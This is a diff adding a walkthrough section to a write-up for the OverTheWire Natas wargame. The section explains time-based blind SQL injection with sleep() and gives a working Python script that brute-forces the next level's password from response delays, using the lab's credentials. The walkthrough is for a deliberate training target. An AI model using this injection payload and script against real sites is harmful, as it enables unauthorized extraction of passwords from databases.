@@ -418,3 +418,53 @@ After executing the code and waiting for a while, we get our password.
 ![alt text](NatasScreenshots/17.png)
 
 # Level 18
+
+This level is similar to level 15. But if you check the source code carefully, you'd notice that the echo command lines are commented which means we get no response wether the typed username exists or no and thus, we can't really tell if our blind guess is correct or not.
+
+What we can do here is rely on timing ! SQL has a built-in function that holds the code for some amount of time called **sleep()**. We can inject an sql querry using this function with this format :
+
+```sql
+SELECT * from users where username = "natas18" and binary substring(password, 1, {count})={password}{char} and sleep(5) #
+```
+
+and check if our guess is true by checking the response time of the session which depends on the time the querry took:
+
+- if the blind guess is true, the substringing comparasion will be true and it will pass to the sleep function which will take 5 seconds before finishing the querry and thus the response time of the session will exceed 5 seconds.
+- if the blind guess is false, the substringing comparasion will be false and since we are working with AND keyword, the querry will exit immediatly without executing the sleep function and thus the response time will be way shorter than 5 seconds.
+
+Let's build the script.
+
+```python
+import requests
+import string
+
+charset = string.ascii_letters + string.digits
+password_length = 32
+password = ""
+
+session = requests.Session()
+session.auth = ("natas17", "EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC")
+
+for count in range(1, password_length + 1):
+   found = False
+   for char in charset:
+       payload = f'natas18" and binary substring(password,1,{count})="{password}{char}" and sleep(5) # '
+       data = {"username": payload}
+       response = session.post("http://natas17.natas.labs.overthewire.org/index.php", data=data)
+
+       if response.elapsed.total_seconds() > 4.9:
+           password += char
+           print(f"Count {count}: {char} (Current: {password})")
+           found = True
+           break
+       else:
+           print(f"Tried char: {char}")
+
+   if not found:
+       print(f"Failed to find character at count {count}. Stopping.")
+       break
+
+print(f"Final password: {password}")
+```
+
+![alt text](NatasScreenshots/18.png)
